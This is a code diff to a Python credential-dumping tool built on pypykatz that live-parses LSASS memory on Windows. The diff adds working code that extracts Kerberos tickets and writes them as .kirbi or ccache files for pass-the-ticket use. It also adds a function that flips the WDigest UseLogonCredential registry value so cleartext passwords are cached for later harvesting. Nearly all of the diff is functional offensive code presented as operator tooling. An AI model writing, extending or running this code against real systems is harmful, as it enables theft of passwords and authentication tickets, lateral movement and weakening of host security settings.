@@ -192,7 +192,8 @@ def parse_dump(dmp_path):
 # on a host where pypykatz is installed to get a self-contained binary that
 # can run sekurlsa against itself.
 # ---------------------------------------------------------------------------
-def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False):
+def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False,
+                            export_dir=None, export_ccache=None):
     """Live-parse LSASS SSPs in-memory. Returns (ok, text_report).
 
     Args:
@@ -204,6 +205,10 @@ def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False):
                    Faster but you lose the decryption keys needed for
                    WDigest / Kerberos / TSPKG / SSP / LiveSSP cleartext.
                    Only MSV (NT/LM hashes) survives.
+        export_dir:  if set, write each recovered Kerberos ticket as a
+                   ``.kirbi`` file into this directory (pass-the-ticket).
+        export_ccache:  if set, write all recovered tickets into a single
+                   MIT ccache file at this path.
     """
     if not _is_windows():
         return False, "sekurlsa::logonpasswords only runs on Windows hosts"
@@ -214,6 +219,12 @@ def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False):
         pkgs = list(packages)
     if not pkgs:
         pkgs = ["all"]
+
+    # If the operator wants tickets, force the kerberos SSP on and remember it.
+    want_tickets = bool(export_dir or export_ccache)
+    if want_tickets and "kerberos" not in pkgs and "all" not in pkgs \
+            and "ktickets" not in pkgs:
+        pkgs.append("kerberos")
 
     try:
         # pypykatz internals: the bundled `pypykatz live` CLI is a stub in
@@ -267,7 +278,70 @@ def sekurlsa_logonpasswords(packages="all", pid=None, no_lsa=False):
     except Exception as e:
         return False, f"apypykatz.start failed: {e}"
 
-    return True, format_sekurlsa(mimi)
+    # ---- Kerberos ticket recovery -------------------------------------
+    # apypykatz.get_kerberos() hard-codes with_tickets=False (upstream marks
+    # it "not working"). When the operator asked for tickets, drive
+    # KerberosDecryptor directly with with_tickets=True and collect the
+    # kirbi blobs. This needs the LSA session key, so it only runs when
+    # no_lsa is False and lsa_decryptor is available.
+    kirbi_blobs = {}   # filename -> bytes
+    if want_tickets and not no_lsa and getattr(mimi, "lsa_decryptor", None):
+        try:
+            from pypykatz.lsadecryptor.packages.kerberos.templates import \
+                KerberosTemplate
+            from pypykatz.lsadecryptor.packages.kerberos.decryptor import \
+                KerberosDecryptor
+            dec_template = KerberosTemplate.get_template(sysinfo)
+            kdec = KerberosDecryptor(reader, dec_template, mimi.lsa_decryptor,
+                                     sysinfo, with_tickets=True)
+            asyncio.run(kdec.start())
+            for cred in kdec.credentials:
+                for ticket in getattr(cred, "tickets", []):
+                    for fn, blob in getattr(ticket, "kirbi_data", {}).items():
+                        try:
+                            kirbi_blobs[fn] = blob.dump()
+                        except AttributeError:
+                            kirbi_blobs[fn] = bytes(blob)
+        except Exception as e:
+            # Non-fatal: report the ticket-recovery failure but keep the rest.
+            mimi.errors.append(("ktickets", e))
+
+    export_msgs = []
+    if kirbi_blobs and export_dir:
+        os.makedirs(export_dir, exist_ok=True)
+        for fn, blob in kirbi_blobs.items():
+            safe = fn.replace("/", "_").replace("\\", "_")
+            path = os.path.join(export_dir, safe)
+            try:
+                with open(path, "wb") as f:
+                    f.write(blob)
+                export_msgs.append(f"wrote {path} ({len(blob)} bytes)")
+            except OSError as e:
+                export_msgs.append(f"failed to write {path}: {e}")
+    if kirbi_blobs and export_ccache:
+        try:
+            from minikerberos.common.ccache import CCACHE
+            from minikerberos.common.kirbi import Kirbi
+            cc = CCACHE()
+            for fn, blob in kirbi_blobs.items():
+                cc.add_kirbi(Kirbi.from_bytes(blob))
+            cc.to_file(export_ccache)
+            export_msgs.append(f"wrote ccache {export_ccache} "
+                               f"({len(kirbi_blobs)} ticket(s))")
+        except Exception as e:
+            export_msgs.append(f"ccache export failed: {e}")
+
+    report = format_sekurlsa(mimi)
+    if want_tickets:
+        report += "\n\n== Kerberos ticket export ==\n"
+        if kirbi_blobs:
+            report += f"recovered {len(kirbi_blobs)} ticket(s)\n"
+        else:
+            report += ("no tickets recovered (none cached, or ktickets "
+                       "parsing failed)\n")
+        for m in export_msgs:
+            report += f"  {m}\n"
+    return True, report
 
 
 def format_sekurlsa(mimi):
@@ -415,6 +489,80 @@ def _emit_msv(lines, d):
     for k, v in d2.items():
         if v not in (None, "", b""):
             lines.append(f"\t * {k:14s}: {v}")
+
+
+def enable_wdigest(disable=False):
+    """Toggle WDigest cleartext-credential storage (UseLogonCredential).
+
+    mimikatz workflow: set ``UseLogonCredential = 1``, wait for a user to
+    re-authenticate, then run ``sekurlsa::logonpasswords`` to recover the
+    cleartext password. This helper performs step 1.
+
+    Writes ``HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\
+    UseLogonCredential`` (DWORD). 1 = store cleartext in memory (enable),
+    0 = do not store (the modern Windows default, disable).
+
+    Requires:
+      * Windows host
+      * Administrator (HKLM write access)
+
+    Returns:
+        (ok, msg)
+    """
+    if not _is_windows():
+        return False, "enable_wdigest only runs on Windows hosts"
+    try:
+        import winreg
+    except ImportError:
+        return False, "winreg not available (not Windows?)"
+
+    key_path = r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+    value = 0 if disable else 1
+    try:
+        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path,
+                                 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
+        winreg.SetValueEx(key, "UseLogonCredential", 0, winreg.REG_DWORD, value)
+        winreg.CloseKey(key)
+    except PermissionError:
+        return False, "access denied writing HKLM (run as admin)"
+    except OSError as e:
+        return False, f"registry write failed: {e}"
+
+    if disable:
+        return True, ("WDigest cleartext storage DISABLED (UseLogonCredential=0). "
+                      "New logons will not leave cleartext passwords in LSASS.")
+    return True, ("WDigest cleartext storage ENABLED (UseLogonCredential=1). "
+                  "Cleartext passwords will be captured on the NEXT interactive/"
+                  "network logon -- re-login (or wait for a service auth) before "
+                  "running sekurlsa to harvest them.")
+
+
+def wdigest_status():
+    """Read the current WDigest UseLogonCredential value.
+
+    Returns (ok, msg) where msg describes the current setting.
+    """
+    if not _is_windows():
+        return False, "wdigest_status only runs on Windows hosts"
+    try:
+        import winreg
+    except ImportError:
+        return False, "winreg not available (not Windows?)"
+    key_path = r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path,
+                             0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
+        val, _ = winreg.QueryValueEx(key, "UseLogonCredential")
+        winreg.CloseKey(key)
+    except FileNotFoundError:
+        return True, ("UseLogonCredential not set (default=0, cleartext "
+                      "storage DISABLED on Win8.1+/Server2012R2+)")
+    except PermissionError:
+        return False, "access denied reading HKLM (run as admin)"
+    except OSError as e:
+        return False, f"registry read failed: {e}"
+    state = "ENABLED" if val == 1 else "DISABLED"
+    return True, f"UseLogonCredential={val} -> WDigest cleartext storage {state}"
 
 
 # ---------------------------------------------------------------------------
